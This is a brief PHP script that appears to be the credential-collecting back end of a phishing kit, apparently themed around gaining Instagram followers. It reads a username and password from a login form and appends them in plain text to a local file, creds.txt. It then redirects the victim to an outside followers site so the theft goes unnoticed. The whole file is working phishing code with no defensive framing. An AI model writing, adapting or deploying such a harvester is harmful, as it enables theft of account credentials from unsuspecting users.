<?php
if (isset($_POST['username'], $_POST['password'])) {
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);

    if ($username === '' || $password === '') {
        header('Location: index.php?error=empty');
        exit;
    }

    $safe_username = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
    $safe_password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

    $file = fopen("creds.txt", "a");
    if ($file === false) {
        die("Error: Unable to write data.");
    }
    fwrite($file, "Username: $safe_username | Password: $safe_password\n");
    fclose($file);

    // Redirect user here after saving data
    header('Location: https://www.getinsfollowers.com/');
    exit;
} else {
    header('Location: index.php');
    exit;
}
?>
